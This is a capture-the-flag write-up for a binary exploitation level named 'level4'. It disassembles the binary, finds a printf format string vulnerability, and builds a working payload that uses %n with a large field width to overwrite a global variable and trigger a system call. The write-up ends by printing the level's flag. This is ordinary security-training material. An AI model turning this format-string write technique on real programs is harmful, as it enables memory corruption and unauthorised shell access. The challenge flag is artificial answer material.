# Level4

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

## Testing the program

```bash
./level4 
hello
hello
```

Once more we have an executable which displays the string passed. 

## Learning more

```bash
disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
``` 

The executable calls a function called 'n'. 

```bash
disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt> --> CALL TO FGETS
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p> --> CALL TO ANOTHER FUNCTION CALLED P
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt> --> CALL TO SYSTEM
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
```

3 things here :
```plaintext
    • a "fgets" call
    • a call to a "p" function
    • a condition for a call to "system"
```

The program compares the value of a global variable m at 0x8049810 to 0x1025544 (16930116 in dec).

```bash
disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
```

Once again we have "printf" that calls the argument, without formater --> Format string again

## Getting access to the shell

Like in level3 our goal is to manipulate the printf() function into changing the value of the variable at the address 0x8049810 so that it equals 16930116. 

1. Print the memory until we reach the address of the variable we wish to modify

```bash 
$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' > /tmp/coucou
$ cat /tmp/coucou - | ./level4
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520
```

The buffer aaaa is at the 12th position (61616161). 

2. Change the value

Our previous method won't work here because the value 16930116 in the comparaison is too long.
However we can use the modifier %d, and dynamically specify the field width (as so : %16930116d).
This will be the only difference between this level and the older one.

3. Making the payload 

We have to reach a total of : 16930116, we have the adrress of m which takes up 4 bytes so our final padding is 16930112. 
Giving us the following payload : 

```bash 
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/coucou
$ cat /tmp/coucou | ./level4
[...]
     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```